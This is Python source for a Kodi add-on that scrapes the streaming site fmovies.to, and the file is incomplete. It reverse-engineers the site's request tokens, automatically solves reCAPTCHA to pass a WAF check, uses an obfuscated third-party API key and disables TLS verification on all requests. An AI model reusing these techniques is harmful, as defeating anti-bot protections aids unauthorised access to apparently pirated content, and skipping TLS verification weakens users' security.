# -*- coding: UTF-8 -*-

import sys, os, re, json, base64
if sys.version_info >= (3,0,0):
# for Python 3
    to_unicode = str
    from resources.lib.cmf3 import parseDOM
    from resources.lib.cmf3 import replaceHTMLCodes
    from urllib.parse import unquote, parse_qs, parse_qsl, quote, urlencode, quote_plus

else:
    # for Python 2
    to_unicode = unicode
    from resources.lib.cmf2 import parseDOM
    from resources.lib.cmf2 import replaceHTMLCodes
    from urllib import unquote, quote, urlencode, quote_plus
    from urlparse import parse_qsl, parse_qs
    
import io

from resources.lib import recaptcha_v2

import xbmc, xbmcvfs

import requests
import xbmcgui
import xbmcplugin
import xbmcaddon

import resolveurl 

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
params = dict(parse_qsl(sys.argv[2][1:]))
addon = xbmcaddon.Addon(id='plugin.video.fmoviesto')

PATH            = addon.getAddonInfo('path')
try:
    DATAPATH        = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
except:
    DATAPATH    = xbmc.translatePath(addon.getAddonInfo('profile')).decode('utf-8')
    
if not os.path.exists(DATAPATH):
    os.makedirs(DATAPATH)
    
jfilename = os.path.join(DATAPATH,'jfilename')
napisy = os.path.join(DATAPATH,'napisy')

RESOURCES      = PATH+'/resources/'

FANART=RESOURCES+'fanart.jpg'

exlink = params.get('url', None)
nazwa= params.get('title', None)
rys = params.get('image', None)
page = params.get('page',[1])[0]


fsortv = addon.getSetting('fsortV')
fsortn = addon.getSetting('fsortN') if fsortv else 'default'

fkatv = addon.getSetting('fkatV')
fkatn = addon.getSetting('fkatN') if fkatv else 'all'

fkrajv = addon.getSetting('fkrajV')
fkrajn = addon.getSetting('fkrajN') if fkrajv else 'all'

frokv = addon.getSetting('frokV')
frokn = addon.getSetting('frokN') if frokv else 'all'

fwerv = addon.getSetting('fwerV')
fwern = addon.getSetting('fwerN') if fwerv else 'all'

fnapv = addon.getSetting('fnapV')
fnapn = addon.getSetting('fnapN') if fnapv else 'all'

fratyv = addon.getSetting('fratyV')
fratyn = addon.getSetting('fratyN') if fratyv else 'all'

sratyv = addon.getSetting('sratyV')
sratyn = addon.getSetting('sratyN') if sratyv else 'all'

snapv = addon.getSetting('snapV')
snapn = addon.getSetting('snapN') if snapv else 'all'

ssortv = addon.getSetting('ssortV')
ssortn = addon.getSetting('ssortN') if ssortv else 'default'

skatv = addon.getSetting('skatV')
skatn = addon.getSetting('skatN') if skatv else 'all'

skrajv = addon.getSetting('skrajV')
skrajn = addon.getSetting('skrajN') if skrajv else 'all'

srokv = addon.getSetting('srokV')
srokn = addon.getSetting('srokN') if srokv else 'all'

swerv = addon.getSetting('swerV')
swern = addon.getSetting('swerN') if swerv else 'all'

dataf =  addon.getSetting('fdata')  
datas =  addon.getSetting('sdata')  

wybornapisow = True

UA='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'

headers = {
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pl,en-US;q=0.7,en;q=0.3',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
}
sess = requests.Session()
def build_url(query):
    return base_url + '?' + urlencode(query)

def add_item(url, name, image, mode, folder=False, IsPlayable=False, infoLabels=False, movie=True,itemcount=1, page=1,fanart=FANART,moviescount=0):
    list_item = xbmcgui.ListItem(label=name)

    if IsPlayable:
        list_item.setProperty("IsPlayable", 'True')
    if not infoLabels:
        infoLabels={'title': name,'plot':name}
    list_item.setInfo(type="video", infoLabels=infoLabels)  
    list_item.setArt({'thumb': image, 'poster': image, 'banner': image, 'icon': image, 'fanart': FANART})
    ok=xbmcplugin.addDirectoryItem(
        handle=addon_handle,
        url = build_url({'mode': mode, 'url' : url, 'page' : page, 'moviescount' : moviescount,'movie':movie,'title':name,'image':image}),          
        listitem=list_item,
        isFolder=folder)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
    return ok
    
def menuMovies():
    add_item('https://fmovies.to/filter?keyword=&type[]=movie', 'List movies', 'DefaultMovies.png', "listmovies", True) 
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+fsortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fsort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+fkrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+fkatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+frokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:frok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+fwern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fwer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]rating:[/COLOR] [B]"+fratyn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fraty', folder=False,fanart='')
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    add_item('f', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)

    xbmcplugin.endOfDirectory(addon_handle)
    
def menuTVshows():
    add_item('https://fmovies.to/filter?keyword=&type[]=tv', 'List tv-series', 'DefaultMovies.png', "listmovies", True) 
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+ssortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:ssort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+skrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+skatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+srokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:srok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+swern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:swer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]rating:[/COLOR] [B]"+sratyn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:sraty', folder=False,fanart='')
    
    
    add_item('s', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    xbmcplugin.endOfDirectory(addon_handle)
def home():
    try:
        if addon.getSetting('pic')!='1':
            ResetAllFilters()
    except:
        pass
    add_item('https://fmovies.to/movies', 'Movies', 'DefaultMovies.png', "menumov", True)   
    add_item('https://fmovies.to/movies', 'TV-Series', 'DefaultMovies.png', "menutvs", True)    
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  

    xbmcplugin.endOfDirectory(addon_handle)
    
def ResetAllFilters()   :
    for x in ['f','s']:
        addon.setSetting(x+'sortN','default')
        addon.setSetting(x+'sortV','&sort=default')
        
        addon.setSetting(x+'katN','all')
        addon.setSetting(x+'katV','')
        
        addon.setSetting(x+'krajN','all')
        addon.setSetting(x+'krajV','')
        
        addon.setSetting(x+'rokN','all')
        addon.setSetting(x+'rokV','')
        
        addon.setSetting(x+'napN','all')
        addon.setSetting(x+'napV','')
        
        
        addon.setSetting(x+'ratyN','all')
        addon.setSetting(x+'ratyV','')
        
        addon.setSetting(x+'data','&sort=default')
        addon.setSetting('pic','1')
        return
def ListMovies(exlink,page):

    links, serials, pagin = getMovies(exlink,page)

    itemz=links
    items = len(links)
    mud='getLinks'
    fold=True
    for f in itemz:
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)   
    itemzx=serials
    items = len(serials)
    mud='getseasons'
    fold=True
    for f in itemzx:
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items) 
    
    if pagin:
        add_item(name='[COLOR blue]>> Next page [/COLOR]', url=exlink, mode='listmovies', image='', folder=True, page=pagin)
    if links or serials:
        xbmcplugin.setContent(addon_handle, 'videos')   

        xbmcplugin.endOfDirectory(addon_handle)     

def getMovies(url,page=1):

    #if not 'search?keyword' in url:
    if '?keyword=&' in url:
        datax = datas if '=tv' in url else dataf
    
        if '&page=' in url:
        
            url = re.sub('\&page=\\d+','&page=%d'%int(page),url)
        else:
        
            url = url +datax+ '&page=%d' %int(page)
    else:
        if '&page=' in url:
        
            url = re.sub('\&page=\\d+','&page=%d'%int(page),url)
        else:
        
            url = url +'&page=%d' %int(page)
    
    nturl = '&amp;page=%d"' %(int(page)+1) 
    #xbmc.log('urlurlurlurlurlurlurlurlurlurlurl: %s'%str(url), level=xbmc.LOGINFO)
    r = sess.get(url,verify=False, headers=headers)
    html=r.content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    out=[]
    serout=[]

    npage=False

    pagination = parseDOM(html, 'ul', attrs={'class': "pagination"}) 
    if pagination:
        npage = str(int(page)+1)if nturl in pagination[0] else False

    result = parseDOM(html, 'div', attrs={'class': "movies\s+.*?"}) [0]
    ids = [(a.start(), a.end()) for a in re.finditer('<div class="item"', result)]
    ids.append( (-1,-1) )
    out=[]
    serout=[]
    for i in range(len(ids[:-1])):
        link = result[ ids[i][1]:ids[i+1][0] ]
        try:
            imag= parseDOM(link, 'img', ret='src')[0]
        except:
            imag= parseDOM(link, 'img', ret='data-src')[0]
        imag = 'https:'+imag if imag.startswith('//') else imag
        title= parseDOM(link, 'a')[-1]
        
        href = parseDOM(link, 'a', ret='href')[-1]
        id =re.findall('([^\-]+$)',href)[0]
        href = 'https://fmovies.to'+href if href.startswith('/') else href
        typ = parseDOM(html, 'i', attrs={'class': "type"})
        typ = typ[0].strip() if typ else ''
            
        
        
        
        plot =''

        ploturl = re.findall('data\-tip\s*=\s*"(.+?)"',link)[0]
        ploturl = 'https://fmovies.to/ajax/film/tooltip/'+ ploturl
        genre =''
        code =''
        year =''
        meta = parseDOM(link, 'div', attrs={'class': "meta"})[0]
        try:
            year = re.findall('(\d{4})', meta)[0]
        except:
            year = ''

        if '.to/tv/' in href:
            # title = title + ' [COLOR gold](serie)[/COLOR]'
            serout.append({'title':PLchar(title),'href':href+'|'+id,'img':imag,'plot':PLchar(plot),'genre':genre,'year':year,'code':code})
        else:
            title = '{} ({})'.format(title,year)
            out.append({'title':PLchar(title),'href':href+'|'+id,'img':imag,'plot':PLchar(plot),'genre':genre,'year':year,'code':code})
    return (out,serout, npage) 
    
def endEN(t, n) :
    return t + n;

def rLMxL(t, n):
    return t < n;

def VHtgA (t, n) :
    return t % n;

def DxlFU(t, n) :
    return rLMxL(t, n);

def dec2(t, n) :
    o=[]
    s=[]
    u=0
    h=''
    for e in range(256):
        s.append(e)

    for e in range(256):
        u = endEN(u + s[e],ord(t[e % len(t)])) % 256
        o = s[e];
        s[e] = s[u];
        s[u] = o;
    e=0
    u=0
    c=0
    for c in range(len(n)):
        e = (e + 1) % 256
        o = s[e]
        u = VHtgA(u + s[e], 256)
        s[e] = s[u];
        s[u] = o;
        try:
            h += chr((n[c]) ^ s[(s[e] + s[u]) % 256]);
        except:
            h += chr(ord(n[c]) ^ s[(s[e] + s[u]) % 256]);
    #print (h)
    return h

def getVerid(id):
###### 12.07.23     
    def convert_func(matchobj):
        m =  matchobj.group(0)

        if m <= 'Z':
            mx = 90
        else:
            mx = 122
        mx2 = ord( m)+ 13  
        if mx>=mx2:
            mx = mx2
        else:
            mx = mx2-26
        gg = chr(mx)
        return gg


    def butxx(t):
        o=''
        for s in range(len(t)):
            u = ord(t[s]) 
            if u==0:
                u=0
            else:
                if (s % 6 == 1):
                    u += 5
                else:
                    if (s % 6 == 5):
                        u -= 6
                    else:
                        if (s % 6 == 0 or s % 6 == 4):
                            u += 6
                        else:
                            if not (s % 6 != 3 and s % 6 != 2):
                                u -= 5
            o += chr(u) 
            
            
    def but(t):
        o=''
        for s in range(len(t)):
            u = ord(t[s]) 
            if u==0:
                u=0
            else:
                if (s % 5 == 1 or s % 5 == 4):
                    u -= 2
                else:
                    if (s % 5 == 3):
                        u += 5;
                    else:
                        if s % 5 == 0 :
                            u -= 4;
                        else:
                            if s % 5 == 2 :
                                u -= 6
            o += chr(u) 
            
            
            
        if sys.version_info >= (3,0,0):
            o=o.encode('Latin_1')

        if sys.version_info >= (3,0,0):
            o=(o.decode('utf-8'))

        return o
    ab = 'DZmuZuXqa9O0z3b7' #####stare
    ab = 'MPPBJLgFwShfqIBx'
    ab = 'rzyKmquwICPaYFkU'
    ab = 'FWsfu0KQd9vxYGNB'
    ac = id
    hj = dec2(ab,ac) #

    if sys.version_info >= (3,0,0):
        hj=hj.encode('Latin_1')

    hj2 = encode2(hj)   

    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
    hj2 = re.sub("[a-zA-Z]", convert_func, hj2) 
    if sys.version_info >= (3,0,0):
        hj2=hj2.encode('Latin_1')
    
    

    
    
    hj2 = encode2(hj2)   
    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
        

    xc= but(hj2) 

    return xc
        
def getLinks(exlink):
    href,id = exlink.split('|')

    html = sess.get(href, headers=headers, verify=False).content

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    idx=re.findall('data\-id\s*=\s*"([^"]+)"',html,re.DOTALL)
    if idx:
    
        result = parseDOM(html, 'section', attrs={'id': "w\-info.*?"})[0]  
        plot = parseDOM(result, 'div', attrs={'class': "description\s*cts.*?"}) 
        plot = PLchar(plot[0]) if plot else ''
        plot = re.sub("<[^>]*>","",plot)
        imag = parseDOM(result, 'img', ret='src')
        imag = imag[0] if imag else ''
        imag = 'https:'+imag if imag.startswith('//') else imag
        
        genres = re.findall('Genre\:(.+?)<\/div>',result)
        genres = genres[0] if genres else ''
        
        gg = re.findall('>([^<]+)<\/a>',genres)
        genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
        
        countries = re.findall('Country\:(.+?)<\/div>',result)  
        countries = countries[0] if countries else ''
        cc = re.findall('>([^<]+)<\/a>',countries)
        country = ', '.join([x.strip() for x in cc]) if gg else ''
        
        tim = re.findall('span>(\d+)\s*min<',result)
        tim = int(tim[0])*60 if tim else ''
        
        
        
        qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
        qual = qual[0].strip() if qual else ''
        
        yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
        yr = yr[0].strip() if yr else ''
        infol = {'plot':plot,'genre': genre,'country':country,'duration':tim,'year':yr}
        
        headers.update({'Referer': href})

        if '.to/tv/' in href:
            verid = getVerid(id)
        else:
            
            idx = re.findall('class\s*=\s*"watch".*?data\-id\s*=\s*"([^"]+)',html,re.DOTALL)

            verid = getVerid(idx[0])
            params = (
            
                ('vrf', verid),
            
            )
            response = sess.get('https://fmovies.to/ajax/episode/list/'+idx[0], headers=headers, params=params, verify=False)

            html= (response.content)
    
            if sys.version_info >= (3,0,0):
                html = html.decode(encoding='utf-8', errors='strict')
            html= html.replace('\\"','"')   
            idx=re.findall('data\-id\s*=\s*"([^"]+)"',html,re.DOTALL)
        
            verid = getVerid(idx[0])
        recap="03AGdBq25eDJkrezDo2y"

        params = (

            ('vrf', verid),

        )
        if '.to/tv/' in href:
            response = sess.get('https://fmovies.to/ajax/server/list/'+id, headers=headers, params=params, verify=False)
        else:
            response = sess.get('https://fmovies.to/ajax/server/list/'+idx[0], headers=headers, params=params, verify=False)

        html= (response.content)
        if sys.version_info >= (3,0,0):
            html = html.decode(encoding='utf-8', errors='strict')
        html= html.replace('\\"','"')

        if 'sitekey=' in html:
        
            sitek=re.findall('data\-sitekey="(.+?)"',html)[0]
        
            token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')
        
            data = {
                    'g-recaptcha-response': token}
            
            response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)
            
            params = (
                ('id', id),
                ('token', token),
            )
            response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)
        
        html = (response.content)
        if sys.version_info >= (3,0,0):
            html = html.decode(encoding='utf-8', errors='strict')
        html= html.replace('\\"','"')

        linki = re.findall('data\-link\-id\s*=\s*"([^"]+).*?<span>([^<]+)',html)
        for linkid1,host in linki:
            tyt = nazwa+' - [I][COLOR khaki]'+host+'[/I] '+' [B][/COLOR][/B]'

            add_item(name=tyt, url=linkid1+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
        
        
        
        
        if len(linki)>0:
        
            xbmcplugin.setContent(addon_handle, 'videos')
            xbmcplugin.endOfDirectory(addon_handle) 
        else:
            xbmcgui.Dialog().notification('[B]Error[/B]', 'Links are not available.',xbmcgui.NOTIFICATION_INFO, 8000,False)
        
def dec(chra):
    excludelist = ['\\xc4\\x99', '\\xc5\\x82', '\\xc5\\x81','\\xc4\\x98','\\xc5\\x9b','\\xc5\\x9a']
    
    try:    
        if sys.version_info >= (3,0,0):

            chra =repr(chra.encode('utf-8'))

            if any(exclude in chra for exclude in excludelist):
            
                return False
            chra = chra.replace('\\xc3\\xaa','ę').replace('\\xc3\\x8a','Ę')

            chra = chra.replace('\\xc3\\xa6','ć').replace('\\xc3\\x86','Ć')
            
            chra = chra.replace('\\xc2\\xbf','ż').replace('\\xc2\\x9f','Ż')
            
            chra = chra.replace('\\xc2\\xb9','ą').replace('\\xc2\\x99','Ą')
            
            chra = chra.replace('\\xc5\\x93','ś').replace('\\xc5\\x92','Ś')
            chra = chra.replace('\\xc3\\xb3','ó').replace('\\xc3\\x93','Ó')
            
            chra = chra.replace('\\xc5\\xb8','ź').replace('\\xc5\\xb7','Ź')
            
            chra = chra.replace('\\xc2\\xb3','ł').replace('\\xc2\\x93','Ł')
            
            chra = chra.replace('\\xc3\\xb1','ń').replace('\\xc3\\x91','Ń')
            

            
            chra = chra .replace("b\'",'')

            chra = chra .replace("\\n",'\n').replace("\\r",'\r') 
            chra = chra .replace("\\'","'")

        else:

            chra = chra.replace('\xc3\xaa','ę').replace('\xc3\x8a','Ę')
            chra = chra.replace('\xc3\xa6','ć').replace('\xc3\x86','Ć')
            chra = chra.replace('\xc2\xbf','ż').replace('\xc2\x9f','Ż')
            chra = chra.replace('\xc2\xb9','ą').replace('\xc2\x99','Ą')
            
            chra = chra.replace('\xc5\x93','ś').replace('\xc5\x92','Ś')
            chra = chra.replace('\xc3\xb3','ó').replace('\xc3\x93','Ó')
            
            chra = chra.replace('\xc5\xb8','ź').replace('\xc5\xb7','Ź')
            
            chra = chra.replace('\xc2\xb3','ł').replace('\xc2\x93','Ł')
            
            chra = chra.replace('\xc3\xb1','ń').replace('\xc3\x91','Ń')



    except:
        pass
        
    return chra
    
def transPolish(subtlink):

    try:
        response = sess.get(subtlink, headers=headers, verify=False)

        if sys.version_info >= (3,0,0):
        
            response  = response.text
        else:
            response  = response.content
        gg=dec(response)

        open(napisy, 'w').write(gg)

        return True
    except:
        return False
    
def PlayLink(exlink):
    id,href = exlink.split('|')
    
    verid = getVerid(id)
    
    params = (
        ('vrf', verid),
    )
    
    headers.update({'Referer': href})
    
    response = sess.get('https://fmovies.to/ajax/server/'+id, headers=headers, params=params, verify=False)
    
    ab=response.content
    if sys.version_info >= (3,0,0):
        ab = ab.decode(encoding='utf-8', errors='strict')
    
    
    try:
        jsonab = json.loads(ab)
    except:
        pass
    if jsonab:
        url = jsonab.get('result',None).get('url',None)
    
    link2 = DecodeLink(url)
    regs = ['?sub.info=', '&sub.info=', '?subtitle_json=', '&subtitle_json=']
    for x in regs:
        if x in link2:
            reg = x
            break
    try:
        link,subt = link2.split(reg)
    except:
        link = link2
        subt = ''
    
    subsout=[]
    
    subtx = unquote(subt)
    subt = False
    if subtx:
        if '&t=' in subtx:
            dd,dd2 = subtx.split('&t=')
            dd2 = quote_plus(dd2)
            subtx = dd+'&t='+dd2
        response = sess.get(subtx, headers=headers, verify=False).json()
    
        for subtitle in response:
            subt = subtitle.get('src',None)
            subt2 = subtitle.get('file',None)
            subt = subt if subt else subt2
            label = subtitle.get('label',None)
            if label.lower() == 'greek':
                label = 'Ελληνικά'
                subsout.insert(0, {'label':label,'subt':subt})
            else:
                subsout.append({'label':label,'subt':subt})
    if wybornapisow and subsout:
        labels = [x.get('label') for x in subsout]
        sel = xbmcgui.Dialog().select('Subtitle language',labels)   
        if sel>-1:
            subt=subsout[sel].get('subt')
            if subsout[sel].get('label') == 'Polish':
            
                subt = napisy if transPolish(subt) else subt
                
        else:
            subt = False

    if 'vidstream' in link2 or 'mcloud' in link2:
        stream_url = decodeVidstream(link2)
    
    
    else:
        try:
            stream_url = resolveurl.resolve(link)
        except Exception as som:
            xbmcgui.Dialog().notification('[B]Error[/B]', str(som),xbmcgui.NOTIFICATION_INFO, 8000,False)
            quit()
    
    if stream_url:
        
        play_item = xbmcgui.ListItem(path=stream_url)
    
        if subt:
            play_item.setSubtitles([subt])
        xbmcplugin.setResolvedUrl(addon_handle, True, listitem=play_item)
        
def decodeVidstream(query):

# ============== function taken aniyomi-extensions - from 9anime extension ================



    SubTitle = query.split('?')[1]
    aniyomi = base64.b64decode('OTNkNDQyMzI3NTU0NGZmMDhlN2I4MjdkNmRlNTRlMmY=').decode('utf8',errors='ignore')
    action = "rawVizcloud" if 'vidstream' in query else "rawMcloud"
    referer = 'https://vidstream.pro/' if 'vidstream' in query else "https://mcloud.to/"
     #   else:
    #            referer = "https://mcloud.to/"
    
    
    
    #action = "rawMcloud"
    query = query.split('e/')[1].split('?')[0]
    
    reqURL = 'https://9anime.eltik.net/'+action+'?query='+query+'&apikey='+aniyomi
    
    futoken = sess.get("https://vidstream.pro/futoken", verify=False)
    futoken = futoken.text

    rawSource = sess.post(reqURL, headers={"Content-Type": "application/x-www-form-urlencoded"}, data={"query": query, "futoken": futoken}, verify=False)
    rawSource= rawSource.text
    next_url =''
    link = ''
    if '"rawURL"' in rawSource:
        jsdata = json.loads(rawSource)
        next_url = jsdata.get('rawURL', None)

    if next_url:
        ff = requests.get(next_url+'?'+SubTitle, headers={'Referer':referer}, verify=False).text
        if 'status":200' in ff:
            srcs = (json.loads(ff)).get('result',None).get('sources',None)
            for src in srcs:
                fil = src.get('file',None)
                if 'm3u8' in fil:
                    link = fil+'|User-Agent='+UA+'&Referer='+referer
                    break

    return link
    
def DecodeLink(mainurl):
    mainurl = mainurl.replace('_', '/').replace('-', '+')
    #
    ab=mainurl[0:6]   #23.09.21
    ac2 = mainurl[6:]   #23.09.21
    ac2 = mainurl#[6:]  #23.09.21
    
    
    
    #ab = 'DZmuZuXqa9O0z3b7'
    ab= 'hlPeNwkncH0fq9so'
    ab = '8z5Ag5wgagfsOuhz'
    
    ac= decode2(mainurl)
    
    link = dekoduj(ab,ac)
    link = unquote(link)
    return link


    
def getFileJson():

    from contextlib import closing
    from xbmcvfs import File
    
    with closing(File(jfilename)) as f:
        jsondata = f.read()
        
    jsondata = json.loads(jsondata)

    html =   jsondata.get('result',None)
    return html


def getLinksSerial(hrefx):

    href,servid = hrefx.split('|')

    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    
    result = parseDOM(html, 'section', attrs={'id': "w\-info"})[0] 
    plot = parseDOM(result, 'div', attrs={'class': "description.*?"})
    
    mname = parseDOM(result, 'h1', attrs={'itemprop': "name","class":"name"}) 
    mname = '[B]'+mname[0]+'[/B] ' if mname else ''
    
    plot = mname+'[CR]'+plot[0] if plot else ''
    imag = parseDOM(result, 'img', ret='src')
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''
    
    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
    
    countries = re.findall('Country\:(.+?)<\/div>',result) 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''
    
    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''
    
    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''
    
    yr = parseDOM(result, 'span', attrs={'class': "year"})  
    yr = yr[0].strip() if yr else ''
    infol = {'plot':plot,'genre': genre,'country':country,'duration':tim,'year':yr}
    
    
    servid = 1
    try:
        href1,serwery = re.findall("""href="([^"]+)"\\n\s*data-kname="%s".*?data\-ep=\\'({.*?)}"""%(hrefx),htmlx,re.DOTALL)[0]
    except:
        servid = 0

    href = 'https://fmovies.to'+href1 if href1.startswith('/') else href1

    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',htmlx,re.DOTALL)
    
    
    
    
    
    
    
    
    nazwax = '- '+nazwa if mname else nazwa
    
    for linkid1,host in linki:
        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '
    
        linkid = re.findall(linkid1+'"\:"([^"]+)',serwery)
        if linkid:
            add_item(name=tyt, url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)

    if servid:
        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle) 
    else:
        xbmcgui.Dialog().notification('[B]Error[/B]', 'Links are not available.',xbmcgui.NOTIFICATION_INFO, 8000,False)

def ListEpisodes(exlink):

    links= getEpisodes(exlink)  
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getLinks', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)
    
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getEpisodes(href):
    seaz,serv = href.split('|')

    html =   getFileJson() 

    episodes = parseDOM(html,'ul', attrs={'class': "episodes",'data\-season': str(seaz)})[0] 
    
    
    
    out=[]

    epizody = parseDOM(episodes, 'li')

    for epi in epizody:

        kname = re.findall('data\-id\s*=\s*"([^"]+)"',epi,re.DOTALL)[0]

        seas = 'S%02d'%int(seaz)
        epis = re.findall('data\-num\s*=\s*"([^"]+)"',epi,re.DOTALL)[0]
        try:
            episod = 'E%02d'%int(epis)
        except:
            episod = 'E-%s'%str(epis)

        title = re.findall('span>\s*<span>([^<]+)',epi,re.DOTALL)
        if title:
            title = re.sub("<[^>]*>","",title[0].strip())
        else:
            title = nazwa.split('-')[-1]
        title = title+' ('+seas+episod+')'
        href = parseDOM(epi, 'a', ret='href')[-1]
        href = 'https://fmovies.to'+href if href.startswith('/') else href
        
        out.append({'title':title ,'href':href+'|'+kname,'img':rys})

    return out
def ListSeasons(exlink):

    links= getSerial(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getEpisodes', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getSerial(href):

    out=[]
    href,id = href.split('|')

    headers.update({'Referer': href})
    html = sess.get(href, headers=headers, verify=False).content

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    idx=re.findall('data\-id\s*=\s*"([^"]+)"',html,re.DOTALL)#[0]
    #i#f idx:
    recap =      addon.getSetting('cap_token')
    if not recap:
    
    
        recap="03AGdBq25eDJkrezDo2y"

    if idx:
        verid = getVerid(idx[0])    

        params = (
            ('vrf', verid),
        
        )

        response = sess.get('https://fmovies.to/ajax/episode/list/'+idx[0], headers=headers, params=params, verify=False)
        

        html = (response.content)
        
        if sys.version_info >= (3,0,0):
            html = html.decode(encoding='utf-8', errors='strict')
        html= html.replace('\\"','"')
        

        jsondata = response.json()
        
        with io.open(jfilename, 'w', encoding='utf8') as f:
            str_ = json.dumps(jsondata,
                indent=4, sort_keys=True,
                separators=(',', ': '), ensure_ascii=False)
            f.write(to_unicode(str_))
        
        html = jsondata.get('result',None)

        sezony = parseDOM(html, 'div', attrs={'class': "head"})[0]
        
        
        
        sezonyx = re.findall('<a(.*?<)\/a>',sezony,re.DOTALL)

        for sez in sezonyx:
            sesid,title = re.findall('data\-season\s*=\s*"([^"]+)"\s*>([^<]+)<',sez,re.DOTALL)[0]

            servers = ''
            out.append({'title':title+nazwa,'href':sesid+'|'+servers,'img':rys})
    return out
    

try:
    import string
    STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    #CUSTOM_ALPHABET =   "5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"   #23/05/22
